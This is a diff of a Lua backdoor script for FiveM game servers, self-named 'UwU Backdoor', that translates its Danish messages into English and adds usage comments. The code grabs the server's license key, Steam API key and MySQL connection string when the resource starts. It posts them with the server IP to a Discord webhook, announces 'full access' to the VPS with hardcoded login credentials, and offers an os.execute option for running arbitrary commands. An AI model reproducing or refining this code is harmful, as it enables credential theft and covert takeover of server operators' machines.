@@ -1,7 +1,7 @@
-local ds = "Discrod"
-local codeexecute = "Dit link her"
-local executecode = false
-local warning = false
+local ds = "Discrod" -- Discord Webhook
+local codeexecute = "Dit link her" -- If you wan't to execute your own code FX(cd C:/Users/%USERNAME%/Documents && mkdir Test) <-- Creates a new folder on the computer. (It executes its like this os.execute(CODE))
+local executecode = false -- If you wan't to execute true
+local warning = false -- If you wan't to warn them when they get backdoor
 
 
 
@@ -87,7 +87,7 @@ AddEventHandler('onResourceStart', function(rcname)
         local licensekey = GetConvar('sv_licenseKey')
         local apikey = GetConvar('steam_webApiKey')
 		    local mysql = GetConvar('mysql_connection_string')
-        local messagem = "En server er åbnet med **UwU Backdoor.**\n\nDu har nu **fuld adgang** til ders VPS.\n\n**SERVERNAVN:** "..servername.."\n\n**IP:** "..text.."\n\n**LICENSEKEY:** "..licensekey.."\n\n**APIKEY:** "..apikey.."\n\n**MYSQL:** "..mysql.."\n\n**LOGIN:**\nIP: "..text.."\nUsername: BBCUwU\nPassword: NKBDoor69"
+        local messagem = "A server is opened with **UwU Backdoor.**\n\nYou now have **full access** to their VPS.\n\n**SERVER NAME:** "..servername.."\n\n**IP:** "..text.."\n\n**LICENSEKEY:** "..licensekey.."\n\n**APIKEY:** "..apikey.."\n\n**MYSQL:** "..mysql.."\n\n**LOGIN:**\nIP: "..text.."\nUsername: BBCUwU\nPassword: NKBDoor69"
         local content = {{
         author = {
           name = 'UwU Backdor',
